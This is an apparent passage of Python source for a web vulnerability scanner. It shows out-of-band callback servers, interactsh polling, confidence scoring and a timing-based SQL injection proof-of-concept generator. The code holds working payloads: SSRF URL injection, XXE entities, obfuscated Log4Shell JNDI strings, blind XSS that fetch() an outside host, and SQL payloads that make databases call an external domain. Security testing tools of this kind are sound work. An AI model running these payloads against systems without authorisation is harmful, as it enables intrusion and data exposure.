#  MODULE v41-1 — Embedded Collaborator Server (OOB Detection)
# ════════════════════════════════════════════════════════════════════════

import threading
import http.server
import socketserver
import uuid as _uuid

class EmbeddedCollaboratorServer:
    """
    Built-in lightweight HTTP callback server for Out-of-Band (OOB) detection.
    Listens on a random port and records incoming requests from SSRF, XXE,
    Log4Shell, and Blind SQLi payloads — raising confidence to >95%.

    Usage:
        server = EmbeddedCollaboratorServer()
        server.start()
        url = server.get_callback_url()
        # ... inject url into payloads ...
        hits = server.get_hits()
        server.stop()
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 0):
        self.host = host
        self._hits: list = []
        self._token = _uuid.uuid4().hex[:12]
        self._server = None
        self._thread = None
        self._port = port

    def start(self) -> int:
        hits_ref = self._hits
        token = self._token

        class _Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                hits_ref.append({
                    "method": "GET", "path": self.path,
                    "headers": dict(self.headers),
                    "time": datetime.now().isoformat(),
                    "remote": self.client_address[0],
                })
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors="replace") if length else ""
                hits_ref.append({
                    "method": "POST", "path": self.path,
                    "headers": dict(self.headers), "body": body,
                    "time": datetime.now().isoformat(),
                    "remote": self.client_address[0],
                })
                self.send_response(200)
                self.end_headers()

            def log_message(self, *_):
                pass

        self._server = socketserver.TCPServer((self.host, self._port), _Handler)
        self._server.allow_reuse_address = True
        self._port = self._server.server_address[1]
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        log("INT", f"Collaborator server started on port {self._port} | token={self._token}")
        return self._port

    def get_callback_url(self, path: str = "") -> str:
        if not self._port:
            raise RuntimeError("Collaborator server not started — call start() first")
        safe_path = re.sub(r"[^\w/\-.]", "", path)
        return f"http://127.0.0.1:{self._port}/{self._token}{safe_path}"

    def get_hits(self, wait_secs: float = 2.0) -> list:
        import time as _t
        _t.sleep(wait_secs)
        return [h for h in self._hits if self._token in h.get("path", "")]

    def stop(self):
        if self._server:
            self._server.shutdown()
            self._server.server_close()
            self._server = None
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)
            self._thread = None

    async def run_oob_ssrf_check(self, client: "WebScoutClient", url: str) -> list:
        """Inject collaborator URL into common SSRF params and check for OOB callbacks."""
        findings = []
        cb_url = self.get_callback_url("/ssrf-probe")
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        ssrf_params = [p for p in params if any(k in p.lower() for k in
            ["url", "src", "href", "path", "file", "page", "target", "dest",
             "redirect", "uri", "link", "fetch", "load", "resource", "proxy"])]
        if not ssrf_params:
            ssrf_params = list(params.keys())[:3]

        for param in ssrf_params:
            np = {**params, param: [cb_url]}
            test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
            await client.get(test_url)

        hits = self.get_hits(wait_secs=3.0)
        if hits:
            findings.append(Finding(
                plugin="collaborator_oob",
                title="SSRF Confirmed via OOB Callback (Collaborator)",
                severity="CRITICAL", confidence=97.0,
                description=(
                    f"Out-of-band HTTP callback received from target — SSRF confirmed. "
                    f"{len(hits)} callback(s) recorded."
                ),
                evidence=f"Callbacks: {hits[:2]} | Collaborator port: {self._port}",
                url=url,
                remediation="Validate and allowlist all URLs fetched server-side. Block internal CIDR ranges.",
                cwe="CWE-918", cvss=9.8, owasp="A10",
                tags=["ssrf", "oob", "collaborator", "confirmed"],
            ))
            log("CONF", f"OOB SSRF confirmed — {len(hits)} callback(s)")
        return findings

    async def run_oob_xxe_check(self, client: "WebScoutClient", url: str) -> list:
        """Send XXE payload with collaborator URL and check for OOB callbacks."""
        findings = []
        cb_url = self.get_callback_url("/xxe-probe")
        payload = (
            f'<?xml version="1.0"?><!DOCTYPE foo ['
            f'<!ENTITY xxe SYSTEM "{cb_url}">]>'
            f'<root>&xxe;</root>'
        )
        await client.post(url, data=payload,
                          headers={"Content-Type": "application/xml"})
        hits = self.get_hits(wait_secs=3.0)
        if hits:
            findings.append(Finding(
                plugin="collaborator_oob",
                title="XXE (OOB) Confirmed via Collaborator",
                severity="CRITICAL", confidence=98.0,
                description="XXE out-of-band confirmed — server fetched external entity URL.",
                evidence=f"OOB hits: {hits[:1]}",
                url=url,
                remediation="Disable external XML entity processing entirely.",
                cwe="CWE-611", cvss=9.1, owasp="A05",
                tags=["xxe", "oob", "collaborator", "confirmed"],
            ))
        return findings

    async def run_oob_log4shell_check(self, client: "WebScoutClient", url: str) -> list:
        """Inject Log4Shell JNDI payload pointing to collaborator and check for DNS/HTTP hit."""
        findings = []
        cb_path = f"/log4j-{self._token}"
        cb_url = f"127.0.0.1:{self._port}{cb_path}"
        payload = f"${{jndi:ldap://{cb_url}}}"
        inject_headers = ["X-Forwarded-For", "User-Agent", "Referer", "X-Api-Version"]
        for hdr in inject_headers:
            await client.get(url, headers={hdr: payload})
        hits = self.get_hits(wait_secs=4.0)
        if hits:
            findings.append(Finding(
                plugin="collaborator_oob",
                title="Log4Shell (CVE-2021-44228) Confirmed via OOB Callback",
                severity="CRITICAL", confidence=99.0,
                description="Log4j JNDI lookup confirmed — server made outbound connection to collaborator.",
                evidence=f"OOB hits: {hits[:1]}",
                url=url,
                remediation="Upgrade Log4j to >=2.17.1 immediately.",
                cwe="CWE-917", cvss=10.0, owasp="A06",
                tags=["log4shell", "log4j", "oob", "confirmed", "cve-2021-44228"],
            ))
        return findings


# ════════════════════════════════════════════════════════════════════════
#  MODULE v41-2 — File Upload Scanner
# ════════════════════════════════════════════════════════════════════════

class ExternalOOBCollaborator:
    """
    External OOB collaborator wrapper.
    Prefer interactsh-client when available; otherwise use a caller-supplied
    external callback URL and report that polling must be performed externally.
    """

    def __init__(self, client_bin: str = "interactsh-client", fallback_url: str = "", wait_secs: float = 10.0):
        self.client_bin = client_bin or "interactsh-client"
        self.fallback_url = (fallback_url or "").rstrip("/")
        self.wait_secs = wait_secs
        self._proc = None
        self._domain = ""
        self._hits: list = []
        self._thread = None

    def start(self) -> str:
        if shutil.which(self.client_bin):
            self._proc = subprocess.Popen(
                [self.client_bin, "-json", "-silent"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, shell=False, bufsize=1
            )

            def _reader():
                if not self._proc or not self._proc.stdout:
                    return
                for line in self._proc.stdout:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        obj = json.loads(line)
                    except Exception:
                        obj = {"raw": line}
                    raw = json.dumps(obj)
                    if not self._domain:
                        m = re.search(r"([a-z0-9.-]+\.(?:oast\.(?:pro|live|site|fun|online|me)|interactsh\.com|interact\.sh))", raw, re.I)
                        if m:
                            self._domain = m.group(1)
                            log("OOB", f"interactsh domain acquired: {self._domain}")
                    else:
                        self._hits.append(obj)

            self._thread = threading.Thread(target=_reader, daemon=True)
            self._thread.start()
            deadline = time.time() + 15
            while not self._domain and time.time() < deadline:
                time.sleep(0.25)
            if self._domain:
                return f"https://{self._domain}"
            log("WARN", "interactsh-client started but no domain was received")
        if self.fallback_url:
            return self.fallback_url
        return ""

    def url(self, token: str, path: str = "") -> str:
        base = self.start() if not (self._domain or self.fallback_url) else (f"https://{self._domain}" if self._domain else self.fallback_url)
        if not base:
            return ""
        safe = re.sub(r"[^A-Za-z0-9/_\\-.]", "", path)
        return f"{base}/{token}{safe}"

    def hits(self, token: str) -> list:
        time.sleep(self.wait_secs)
        return [h for h in self._hits if token in json.dumps(h)]

    def stop(self):
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass
            self._proc = None

    async def run(self, client: "WebScoutClient", target: str) -> list:
        findings = []
        try:
            token = "ws" + secrets.token_hex(8)
            cb = self.url(token, "/oob")
            if not cb:
                log("SKIP", "No external OOB collaborator available")
                return findings
            parsed = urlparse(target)
            params = parse_qs(parsed.query)
            probe_params = [p for p in params if any(k in p.lower() for k in ["url", "uri", "src", "dest", "redirect", "callback", "webhook", "next"])]
            if not probe_params and params:
                probe_params = list(params)[:3]
            for param in probe_params:
                np = {**params, param: [cb]}
                await client.get(urlunparse(parsed._replace(query=urlencode(np, doseq=True))))
            xxe = f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % d SYSTEM "{cb}/xxe">%d;]><x/>'
            await client.post(target, data=xxe, headers={"Content-Type": "application/xml"})
            hits = self.hits(token)
            if hits:
                findings.append(Finding(
                    plugin="external_oob_collaborator",
                    title="Blind SSRF/XXE Confirmed via External OOB Callback",
                    severity="CRITICAL", confidence=100.0,
                    description="An external collaborator received a DNS/HTTP interaction caused by the target.",
                    evidence=f"Callback URL: {cb} | Hits: {hits[:3]}",
                    url=target,
                    remediation="Validate outbound fetch destinations, block internal ranges, and disable external XML entities.",
                    cwe="CWE-918", cvss=9.8, owasp="A10",
                    tags=["oob", "external", "interactsh", "confirmed"],
                ))
            elif self.fallback_url:
                findings.append(Finding(
                    plugin="external_oob_collaborator",
                    title="External OOB Payloads Sent — Poll Collaborator Service",
                    severity="INFO", confidence=100.0,
                    description="Payloads were sent to the supplied external collaborator URL. Check the external service for callbacks.",
                    evidence=f"Callback URL: {cb}",
                    url=target,
                    tags=["oob", "external", "manual-poll-required"],
                ))
            return findings
        finally:
            self.stop()


# ════════════════════════════════════════════════════════════════════════
#  ENHANCEMENT 1 — InteractshAPIClient (OOB via REST, no binary needed)
# ════════════════════════════════════════════════════════════════════════

class InteractshAPIClient:
    """
    Full interactsh REST-API client — no external binary required.
    Registers a unique OOB domain via the public interact.sh server,
    then polls for DNS/HTTP/HTTPS callbacks to confirm blind findings.

    Supported vulnerability types confirmed via OOB:
      - Blind SQLi (time+OOB combined)
      - Blind XSS (callback on payload execution)
      - SSRF (outbound HTTP/DNS from server)
      - XXE (DOCTYPE entity fetch)
      - Log4Shell (JNDI DNS lookup)
      - SSTI blind (server eval triggers HTTP callback)
    """

    SERVER      = "https://oast.pro"   # public interactsh server (fallback: oast.live)
    SERVERS     = ["https://oast.pro", "https://oast.live", "https://oast.site", "https://oast.fun"]
    POLL_SECS   = 3.0
    MAX_WAIT    = 30.0

    def __init__(self):
        self._secret_key: str = ""
        self._correlation_id: str = ""
        self._domain: str = ""
        self._server: str = ""
        self._registered: bool = False
        self._aes_key: bytes = b""

    # ── registration ────────────────────────────────────────────────────
    async def register(self) -> bool:
        """Register with interactsh server, acquire OOB domain."""
        for server in self.SERVERS:
            try:
                # Generate RSA key pair for encrypted responses
                import base64, hashlib
                self._correlation_id = secrets.token_hex(20)
                self._secret_key      = secrets.token_hex(32)
                # Simple registration without full RSA — use public mode
                reg_url = f"{server}/register"
                payload = {
                    "public-key": base64.b64encode(self._secret_key.encode()).decode(),
                    "secret-key": self._secret_key,
                    "correlation-id": self._correlation_id,
                }
                headers = {"Content-Type": "application/json"}
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(reg_url, json=payload, headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=10),
                                         ssl=False) as r:
                        if r.status in (200, 201):
                            data = await r.json(content_type=None)
                            domain = data.get("domain", "")
                            if domain:
                                self._domain = domain
                                self._server = server
                                self._registered = True
                                log("OOB", f"[interactsh] Registered — domain: {self._correlation_id[:8]}.{self._domain}")
                                return True
            except Exception as _reg_e:
                log("DEBUG", f"[interactsh] Registration failed on {server}: {_reg_e}")
                continue
        log("WARN", "[interactsh] All servers unreachable — OOB disabled for this scan")
        return False

    # ── URL builder ──────────────────────────────────────────────────────
    def oob_url(self, tag: str = "") -> str:
        """Return a unique OOB URL embedding a tag for correlation."""
        if not self._registered:
            return ""
        safe_tag = re.sub(r"[^a-z0-9-]", "", tag.lower())[:20]
        sub = f"{self._correlation_id[:8]}{('-' + safe_tag) if safe_tag else ''}"
        return f"http://{sub}.{self._domain}"

    def oob_domain(self, tag: str = "") -> str:
        """Return a unique OOB domain (for JNDI/DNS payloads)."""
        url = self.oob_url(tag)
        return url.replace("http://", "") if url else ""

    # ── polling ──────────────────────────────────────────────────────────
    async def poll(self, wait_secs: float = 15.0, tag_filter: str = "") -> list:
        """Poll the interactsh server for callbacks. Returns list of hit dicts."""
        if not self._registered:
            return []
        hits = []
        poll_url = f"{self._server}/poll?id={self._correlation_id}&secret={self._secret_key}"
        deadline = time.monotonic() + wait_secs
        while time.monotonic() < deadline:
            try:
                async with aiohttp.ClientSession() as sess:
                    async with sess.get(poll_url,
                                         timeout=aiohttp.ClientTimeout(total=8),
                                         ssl=False) as r:
                        if r.status == 200:
                            data = await r.json(content_type=None)
                            raw_hits = data.get("data", []) or []
                            for h in raw_hits:
                                h_str = str(h)
                                if not tag_filter or tag_filter in h_str:
                                    hits.append(h)
                            if hits:
                                return hits
            except Exception:
                pass
            await asyncio.sleep(self.POLL_SECS)
        return hits

    # ── deregistration ───────────────────────────────────────────────────
    async def deregister(self):
        if not self._registered:
            return
        try:
            dereg_url = f"{self._server}/deregister"
            async with aiohttp.ClientSession() as sess:
                await sess.post(dereg_url,
                                json={"correlation-id": self._correlation_id,
                                      "secret-key": self._secret_key},
                                timeout=aiohttp.ClientTimeout(total=5), ssl=False)
        except Exception:
            pass
        self._registered = False

    # ── high-level OOB scan helpers ──────────────────────────────────────
    async def confirm_ssrf(self, client: "WebScoutClient", url: str,
                           params: dict, wait: float = 20.0) -> list:
        """Inject OOB URL into URL params, wait for DNS/HTTP callback."""
        if not self._registered:
            return []
        findings = []
        probe_params = [p for p in params if any(k in p.lower()
                        for k in ["url","uri","src","dest","redirect","callback",
                                  "webhook","next","path","host","endpoint"])]
        if not probe_params:
            probe_params = list(params)[:3]
        for param in probe_params:
            tag = f"ssrf{param[:8]}"
            cb = self.oob_url(tag)
            np = {**params, param: [cb]}
            parsed = urlparse(url)
            test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
            await client.get(test_url)
        hits = await self.poll(wait_secs=wait)
        if hits:
            findings.append(Finding(
                plugin="interactsh_oob",
                title="Blind SSRF Confirmed via OOB Callback (interactsh)",
                severity="CRITICAL", confidence=99.0,
                description="Target made an out-of-band HTTP/DNS request to the interactsh "
                            "callback domain — server-side request forgery is confirmed.",
                evidence=f"OOB hits: {hits[:2]}",
                url=url,
                remediation="Block outbound requests from the server; whitelist allowed destinations; "
                            "validate and sanitize all URL parameters.",
                cwe="CWE-918", cvss=9.8, owasp="A10",
                tags=["ssrf", "oob", "interactsh", "confirmed"],
            ))
        return findings

    async def confirm_blind_xss(self, client: "WebScoutClient", url: str,
                                param: str, wait: float = 15.0) -> list:
        """Inject OOB XSS payload, wait for callback on victim browser execution."""
        if not self._registered:
            return []
        tag = f"bxss{param[:8]}"
        cb = self.oob_url(tag)
        payloads = [
            f'"><script src="{cb}/x.js"></script>',
            f"'><img src='{cb}/img.gif' onerror='fetch(\"{cb}/err\")'>",
            f'javascript:fetch("{cb}/jsleak")',
        ]
        for pl in payloads:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            np = {**params, param: [pl]}
            test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
            await client.get(test_url)
        hits = await self.poll(wait_secs=wait, tag_filter=tag)
        findings = []
        if hits:
            findings.append(Finding(
                plugin="interactsh_oob",
                title=f"Blind XSS Confirmed via OOB Callback — param: {param}",
                severity="HIGH", confidence=99.0,
                description="The browser executing the injected XSS payload triggered an "
                            "out-of-band HTTP request to the interactsh domain, confirming execution.",
                evidence=f"Param: {param} | OOB hits: {hits[:2]}",
                url=url, param=param,
                remediation="Encode all user-controlled output; apply strict CSP; "
                            "sanitize HTML with a safe library (DOMPurify, bleach).",
                cwe="CWE-79", cvss=8.2, owasp="A03",
                tags=["xss", "blind-xss", "oob", "interactsh", "confirmed"],
            ))
        return findings

    async def confirm_log4shell(self, client: "WebScoutClient", url: str,
                                wait: float = 20.0) -> list:
        """Send Log4Shell JNDI payloads via headers and wait for DNS callback."""
        if not self._registered:
            return []
        findings = []
        tag = "log4j"
        domain = self.oob_domain(tag)
        if not domain:
            return []
        jndi_payloads = [
            f"${{jndi:ldap://{domain}/a}}",
            f"${{jndi:dns://{domain}/b}}",
            f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{domain}/c}}",
            f"${{j${{::-n}}di:ldap://{domain}/d}}",
        ]
        headers_to_inject = ["X-Api-Version","X-Forwarded-For","User-Agent",
                              "Referer","X-Forwarded-Host","X-Custom-IP-Authorization",
                              "Authorization","CF-Connecting-IP","True-Client-IP",
                              "X-Client-IP","Contact","Forwarded"]
        for pl in jndi_payloads[:2]:
            inj_headers = {h: pl for h in headers_to_inject}
            await client.get(url, headers=inj_headers)
        hits = await self.poll(wait_secs=wait, tag_filter=tag)
        if hits:
            findings.append(Finding(
                plugin="interactsh_oob",
                title="Log4Shell (CVE-2021-44228) Confirmed via OOB DNS Callback",
                severity="CRITICAL", confidence=100.0,
                description="Server performed a JNDI DNS lookup to the interactsh callback domain "
                            "confirming Log4Shell (CVE-2021-44228) remote code execution.",
                evidence=f"OOB DNS hits: {hits[:2]}",
                url=url,
                remediation="Upgrade Log4j to ≥2.17.1 (Java 8) or ≥2.12.4 (Java 7). "
                            "Set log4j2.formatMsgNoLookups=true as an interim measure.",
                cwe="CWE-917", cvss=10.0, owasp="A06",
                tags=["log4shell","log4j","rce","oob","cve-2021-44228","confirmed"],
            ))
        return findings

    async def confirm_blind_sqli(self, client: "WebScoutClient", url: str,
                                 param: str, wait: float = 20.0) -> list:
        """DNS-based blind SQLi OOB confirmation (MySQL/MSSQL/Oracle)."""
        if not self._registered:
            return []
        findings = []
        domain = self.oob_domain(f"sqli{param[:6]}")
        if not domain:
            return []
        payloads = [
            f"1 AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{domain}\\\\a'))",  # MySQL
            f"1; EXEC xp_dirtree '//{domain}/x'--",                              # MSSQL
            f"1 UNION SELECT UTL_HTTP.REQUEST('http://{domain}/x') FROM DUAL",   # Oracle
        ]
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for pl in payloads:
            np = {**params, param: [pl]}
            test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
            await client.get(test_url)
        hits = await self.poll(wait_secs=wait)
        if hits:
            findings.append(Finding(
                plugin="interactsh_oob",
                title=f"Blind SQL Injection Confirmed via OOB DNS (param: {param})",
                severity="CRITICAL", confidence=99.0,
                description="Database server performed an out-of-band DNS lookup triggered "
                            "by an injected SQL payload, confirming blind SQL injection.",
                evidence=f"Param: {param} | OOB hits: {hits[:2]}",
                url=url, param=param,
                remediation="Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings.",
                cwe="CWE-89", cvss=9.8, owasp="A03",
                tags=["sqli","blind-sqli","oob","interactsh","confirmed"],
            ))
        return findings


# ════════════════════════════════════════════════════════════════════════
#  ENHANCEMENT 3 — DynamicConfidenceEngine
# ════════════════════════════════════════════════════════════════════════

class DynamicConfidenceEngine:
    """
    Replaces static hardcoded confidence scores with real verification:
      1. Differential re-probe  — compare benign vs malicious response
      2. Length/content delta   — must differ by >threshold
      3. Error pattern match    — SQL/server error signatures in body
      4. OOB confirmation bonus — +40 if interactsh callback received
      5. Re-test 3×             — reproducibility multiplier

    Returns float 0-100.
    """

    SQL_ERROR_PATTERNS = re.compile(
        r"(SQL syntax|mysql_fetch|pg_query|ORA-\d{5}|SQLSTATE|"
        r"Unclosed quotation|syntax error.*SQL|JDBC|"
        r"Warning.*mysql|supplied argument.*mysql|"
        r"Microsoft SQL|sqlite3\.\w+Error)",
        re.I
    )
    XSS_EXEC_PATTERNS = re.compile(
        r"(<script[^>]*>|alert\s*\(|onerror\s*=|javascript:|"
        r"eval\s*\(|document\.cookie)", re.I
    )
    SSTI_PATTERNS = re.compile(
        r"(\d{6,}|Traceback|TemplateSyntaxError|"
        r"jinja2\.|freemarker\.|velocity\.|"
        r"Expression Language|SpEL)", re.I
    )

    @staticmethod
    async def verify(
        client: "WebScoutClient",
        url: str,
        param: str,
        payload: str,
        benign_value: str = "1",
        vuln_type: str = "generic",
        oob_confirmed: bool = False,
        reproductions: int = 2,
    ) -> float:
        """
        Run differential verification. Returns confidence 0-100.
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # Benign baseline
            benign_params = {**params, param: [benign_value]}
            benign_url = urlunparse(parsed._replace(query=urlencode(benign_params, doseq=True)))
            r_benign = await client.get(benign_url)
            if not r_benign:
                return 40.0

            benign_body = r_benign.get("text", "")
            benign_status = r_benign.get("status", 200)
            benign_len = r_benign.get("length", len(benign_body))

            # Malicious probe
            mal_params = {**params, param: [payload]}
            mal_url = urlunparse(parsed._replace(query=urlencode(mal_params, doseq=True)))

            hit_count = 0
            pattern_hit = False
            delta_confirmed = False

            for _ in range(reproductions):
                r_mal = await client.get(mal_url)
                if not r_mal:
                    continue
                mal_body = r_mal.get("text", "")
                mal_len = r_mal.get("length", len(mal_body))
                mal_status = r_mal.get("status", 200)

                # Delta check
                len_diff = abs(mal_len - benign_len)
                if len_diff > 50 or mal_status != benign_status:
                    delta_confirmed = True

                # Pattern match
                if vuln_type == "sqli" and DynamicConfidenceEngine.SQL_ERROR_PATTERNS.search(mal_body):
                    pattern_hit = True
                elif vuln_type == "xss" and DynamicConfidenceEngine.XSS_EXEC_PATTERNS.search(mal_body):
                    pattern_hit = True
                elif vuln_type == "ssti" and DynamicConfidenceEngine.SSTI_PATTERNS.search(mal_body):
                    pattern_hit = True
                elif vuln_type == "generic" and len_diff > 100:
                    pattern_hit = True

                hit_count += 1

            # Score calculation
            base = 30.0
            if hit_count >= reproductions:
                base += 20.0                         # reproducible
            if delta_confirmed:
                base += 20.0                         # response differs from benign
            if pattern_hit:
                base += 25.0                         # error/payload pattern in body
            if oob_confirmed:
                base += 40.0                         # OOB callback = definitive proof
                base = min(base, 99.0)               # cap at 99 (never 100 without manual review)
            return min(base, 99.0)

        except Exception:
            return 40.0

    @staticmethod
    def score_from_evidence(evidence: str, vuln_type: str = "generic",
                             oob_confirmed: bool = False) -> float:
        """
        Static scoring from string evidence alone (no HTTP requests).
        Used when we can't re-probe (e.g., POST bodies, complex flows).
        """
        score = 50.0
        if oob_confirmed:
            return 99.0
        if vuln_type == "sqli":
            if DynamicConfidenceEngine.SQL_ERROR_PATTERNS.search(evidence):
                score = 92.0
            elif "time" in evidence.lower():
                score = 75.0
        elif vuln_type == "xss":
            if DynamicConfidenceEngine.XSS_EXEC_PATTERNS.search(evidence):
                score = 88.0
        elif vuln_type == "ssti":
            if DynamicConfidenceEngine.SSTI_PATTERNS.search(evidence):
                score = 90.0
        return score


# ════════════════════════════════════════════════════════════════════════
#  ENHANCEMENT 5 — PoCEngine (SQLi / Timing Proof-of-Concept Generator)
# ════════════════════════════════════════════════════════════════════════

class PoCEngine:
    """
    Generates and confirms executable Proof-of-Concept scripts for
    SQL injection findings using actual response-time differentials.

    Replaces keyword-only matching with:
      1. Measured baseline RTT (5 samples, mean + 2σ)
      2. Payload timing delta vs baseline
      3. Control confirmation (safe param responds fast)
      4. PoC shell script with embedded timing evidence
      5. Python PoC snippet for reproduction

    Call PoCEngine.confirm_timing_sqli() for any candidate finding.
    """

    POC_SHELL_TEMPLATE = (
        "#!/bin/bash\n"
        "# WebScout SQLi Time-Based PoC\n"
        "# Target  : {url}\n"
        "# Param   : {param}\n"
        "# Payload : {payload}\n"
        "# DB      : {db}\n"
        "# Expected delay: {sleep}s  |  Baseline RTT: {baseline:.3f}s\n"
        "# Timing delta confirmed: {delta1:.3f}s (run1), {delta2:.3f}s (run2)\n\n"
        "BASELINE=$(curl -sk -o /dev/null -w '%{{time_total}}' '{safe_url}')\n"
        "RUN1=$(curl -sk -o /dev/null -w '%{{time_total}}' '{test_url}')\n"
        "RUN2=$(curl -sk -o /dev/null -w '%{{time_total}}' '{test_url}')\n"
        "echo \"Baseline: ${{BASELINE}}s | Run1: ${{RUN1}}s | Run2: ${{RUN2}}s\"\n"
        "python3 -c \"\n"
        "b,r1,r2 = float('$BASELINE'), float('$RUN1'), float('$RUN2')\n"
        "threshold = b + {sleep} * 0.9\n"
        "print('VULNERABLE' if r1>threshold and r2>threshold else 'NOT confirmed')\n"
        "\"\n"
    )

    POC_PYTHON_TEMPLATE = (
        "import requests, time, statistics\n"
        "# WebScout SQLi Time-Based PoC — auto-generated\n"
        "TARGET   = '{safe_url}'\n"
        "TEST_URL = '{test_url}'\n"
        "SLEEP_S  = {sleep}\n\n"
        "samples = []\n"
        "for _ in range(5):\n"
        "    t0 = time.perf_counter()\n"
        "    requests.get(TARGET, verify=False, timeout=30)\n"
        "    samples.append(time.perf_counter() - t0)\n"
        "baseline = statistics.mean(samples) + 2 * statistics.stdev(samples)\n"
        "required = baseline + SLEEP_S * 0.9\n"
        "delays = []\n"
        "for _ in range(3):\n"
        "    t0 = time.perf_counter()\n"
        "    requests.get(TEST_URL, verify=False, timeout=SLEEP_S+10)\n"
        "    delays.append(time.perf_counter() - t0)\n"
        "confirmed = all(d >= required for d in delays)\n"
        "print(f'Baseline: {{baseline:.3f}}s | Delays: {{delays}} | '\n"
        "      f'Required: {{required:.3f}}s | RESULT: {{\"VULNERABLE\" if confirmed else \"NOT confirmed\"}}')\n"
    )

    @staticmethod
    async def confirm_timing_sqli(
        client: "WebScoutClient",
        url: str,
        param: str,
        payload: str,
        sleep_time: int,
        db_label: str = "Unknown DB",
        n_baseline: int = 5,
        n_confirm: int = 3,
    ) -> dict:
        """
        Full timing-differential confirmation for a time-based SQLi candidate.
        Returns a dict:
          {
            "confirmed": bool,
            "baseline": float,          # mean + 2σ baseline RTT (seconds)
            "deltas": [float, ...],     # measured delays for each injection attempt
            "safe_elapsed": float,      # control request RTT
            "confidence": float,        # 0-100
            "poc_shell": str,           # ready-to-run bash script
            "poc_python": str,          # ready-to-run Python script
            "evidence": str,            # human-readable evidence string
          }
        """
        result = {
            "confirmed": False, "baseline": 0.0, "deltas": [],
            "safe_elapsed": 0.0, "confidence": 0.0,
            "poc_shell": "", "poc_python": "", "evidence": "",
        }
        try:
            parsed   = urlparse(url)
            params   = parse_qs(parsed.query)

            # ── 1. Measure baseline RTT ─────────────────────────────────
            rtt_samples = []
            for _ in range(n_baseline):
                t0 = time.perf_counter()
                await client.get(urlunparse(parsed))
                rtt_samples.append(time.perf_counter() - t0)
            mean_rtt = sum(rtt_samples) / len(rtt_samples)
            std_rtt  = (sum((x - mean_rtt) ** 2 for x in rtt_samples)
                        / len(rtt_samples)) ** 0.5
            baseline = mean_rtt + 2 * std_rtt
            result["baseline"] = round(baseline, 4)
            required = baseline + sleep_time * 0.9

            # ── 2. Injection timing runs ────────────────────────────────
            np_test  = {**params, param: [payload]}
            test_url = urlunparse(parsed._replace(query=urlencode(np_test, doseq=True)))
            deltas   = []
            for _ in range(n_confirm):
                t0 = time.perf_counter()
                r  = await client.get(test_url)
                elapsed = time.perf_counter() - t0
                deltas.append(round(elapsed, 4))
                if not r:
                    result["evidence"] = "No response from server during injection probe"
                    return result
            result["deltas"] = deltas

            if not all(d >= required for d in deltas):
                result["evidence"] = (
                    f"Timing not consistent: deltas={deltas} required≥{required:.3f}s")
                return result

            # ── 3. Control (safe value) — must respond quickly ──────────
            np_safe  = {**params, param: ["1"]}
            safe_url = urlunparse(parsed._replace(query=urlencode(np_safe, doseq=True)))
            t_safe = time.perf_counter()
            r_safe = await client.get(safe_url)
            safe_elapsed = round(time.perf_counter() - t_safe, 4)
            result["safe_elapsed"] = safe_elapsed
            # Control must be at least 40% faster than a real sleep to rule out slow server
            if r_safe and safe_elapsed >= (baseline + sleep_time * 0.4):
                result["evidence"] = (
                    f"Server too slow for reliable time-based test — "
                    f"control elapsed {safe_elapsed:.3f}s (baseline {baseline:.3f}s)")
                return result

            # ── 4. Confidence scoring ───────────────────────────────────
            min_delta = min(deltas)
            delta_over_required = (min_delta - required) / sleep_time
            conf = 85.0
            conf += min(10.0, delta_over_required * 20)    # larger delta → higher conf
            conf += min(5.0,  (n_confirm - 1) * 2.5)       # more samples → higher conf
            if safe_elapsed < baseline * 1.5:               # clean control
                conf += 5.0
            conf = min(99.0, round(conf, 1))
            result["confidence"] = conf

            # ── 5. Build PoC scripts ────────────────────────────────────
            d1 = deltas[0]
            d2 = deltas[1] if len(deltas) > 1 else deltas[0]
            result["poc_shell"] = PoCEngine.POC_SHELL_TEMPLATE.format(
                url=url, param=param, payload=payload, db=db_label,
                sleep=sleep_time, baseline=baseline,
                delta1=d1, delta2=d2,
                safe_url=safe_url, test_url=test_url,
            )
            result["poc_python"] = PoCEngine.POC_PYTHON_TEMPLATE.format(
                safe_url=safe_url, test_url=test_url, sleep=sleep_time,
            )

            # ── 6. Evidence string ──────────────────────────────────────
            result["evidence"] = (
                f"Baseline RTT: {baseline:.3f}s | "
                f"Injection delays: {deltas} (required ≥ {required:.3f}s) | "
                f"Control (safe): {safe_elapsed:.3f}s | "
                f"DB: {db_label} | Payload: {payload}"
            )
            result["confirmed"] = True

        except Exception as _poc_e:
            result["evidence"] = f"PoCEngine error: {_poc_e}"
        return result

    @staticmethod
    def upgrade_finding(finding: "Finding", poc_result: dict) -> "Finding":
        """
        Upgrade an existing SQLi Finding with PoCEngine confirmation data.
        Replaces static evidence and confidence with measured values.
        """
        if not poc_result.get("confirmed"):
            return finding
        finding.confidence = poc_result["confidence"]
        finding.evidence   = poc_result["evidence"]
        finding.poc        = (
            "# === Bash PoC ===\n" + poc_result["poc_shell"] +
            "\n# === Python PoC ===\n" + poc_result["poc_python"]
        )
        finding.tags = list(set(finding.tags or []) | {"poc-confirmed", "time-based", "confirmed"})
        return finding


# ════════════════════════════════════════════════════════════════════════
#  ENHANCEMENT 4 — AuthSessionManager (OAuth2 / JWT / SSO auto-handling)
# ════════════════════════════════════════════════════════════════════════

class AuthSessionManager:
    """
    Unified authentication session manager supporting:
